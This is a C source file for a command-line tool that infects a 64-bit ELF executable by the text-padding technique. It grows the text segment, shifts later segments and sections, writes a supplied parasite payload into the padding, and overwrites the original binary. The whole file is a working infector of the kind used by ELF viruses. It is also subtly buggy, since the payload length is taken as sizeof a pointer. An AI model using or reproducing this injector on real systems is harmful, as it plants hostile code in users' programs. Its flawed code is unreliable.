
#include "headers.h"

/* Text padding injection */
Elf64_Addr inject_elf(elf64_t *telf, uint8_t *pcode)
{
	int ofd, plen;
	Elf64_Addr paddr;
	Elf64_Off poff;

	uint8_t *empty;

	/* Get the text segment */
	plen = sizeof(pcode);
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_type == PT_LOAD && !telf->phdr[i].p_offset)
		{
			paddr = telf->phdr[i].p_vaddr + telf->phdr[i].p_memsz;
			poff = telf->phdr[i].p_offset + telf->phdr[i].p_filesz;
			telf->phdr[i].p_filesz += plen;
			telf->phdr[i].p_memsz += plen;
			break;
		}
	}

	/* Adjust the virtual address of segments after text segment */
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_offset >= poff)
		{
			telf->phdr[i].p_offset += PAGE_SIZE;
			printf("Adjust segment %d offset to 0x%08lx\n", i, telf->phdr[i].p_offset);
		}
	}

	/* Adjust the offset of sections after parasite offset */
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_offset >= poff)
			telf->shdr[i].sh_offset += PAGE_SIZE;
		else if (telf->shdr[i].sh_addr + telf->shdr[i].sh_size == paddr)
			telf->shdr[i].sh_size += plen;
	}
	telf->ehdr->e_shoff += PAGE_SIZE;

	/* Open output file */
	if ((ofd = open(TMP_FILE, O_CREAT | O_WRONLY, telf->mode)) < 0)
	{
		fprintf(stderr, "[-] Open file %s failed\n", TMP_FILE);
		return -1;
	}

	if (!(empty = (uint8_t *)malloc(PAGE_SIZE - plen)))
	{
		perror("Malloc");
		return -1;
	}
	memset(empty, 0, PAGE_SIZE - plen);

	/* Inject the parasite code */
	if (write(ofd, telf->mem, poff) != poff)
	{
		perror("Write mem");
		return -1;
	}

	if (write(ofd, pcode, plen) != plen)
	{
		perror("Write pcode");
		return -1;
	}

	if (write(ofd, empty, PAGE_SIZE - plen) != PAGE_SIZE - plen)
	{
		perror("Write empty");	
		return -1;
	}

	if (write(ofd, telf->mem + poff, telf->size - poff) != telf->size - poff)
	{
		perror("Write mem + poff");
		return -1;
	}

	if (fsync(ofd) < 0)
	{
		fprintf(stderr, "[-] Fsync file %s failed\n", TMP_FILE);
		return -1;
	}

	close(ofd);
	unload_elf(telf);
	unlink(telf->path);
	rename(TMP_FILE, telf->path);

	return paddr;
}

int main(int argc, char *argv[])
{
	elf64_t telf;
	int fd;
	struct stat st;
	uint8_t *pcode;

	if (argc != 3)
	{
		printf("Usage: %s <target file> <parasite file>\n", argv[0]);
		exit(-1);
	}

	if (load_elf(argv[1], &telf) == -1)
	{
		fprintf(stderr, "%s Load file %s failed!\n", RED("[-]"), argv[1]);
		exit(-1);
	}
	printf("%s Load file %s success\n", GREEN("[+]"), argv[1]);

	if ((fd = open(argv[2], O_RDONLY)) < 0)
	{
		fprintf(stderr, "%s Open file %s failed\n", RED("[-]"), argv[2]);
		exit(-1);
	}

	if (fstat(fd, &st) < 0)
	{
		fprintf(stderr, "%s Get file %s stat failed\n", RED("[-]"), argv[2]);
		exit(-1);
	}

	pcode = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (pcode == MAP_FAILED)
	{
		fprintf(stderr, "%s Map file %s failed\n", RED("[-]"), argv[2]);
		exit(-1);
	}

	if (inject_elf(&telf, pcode) == -1)
	{
		fprintf(stderr, "%s Inject file %s failed\n", RED("[-]"), argv[1]);
		exit(-1);
	}
	printf("%s Inject file %s success\n", GREEN("[+]"), argv[1]);

	return 0;
}
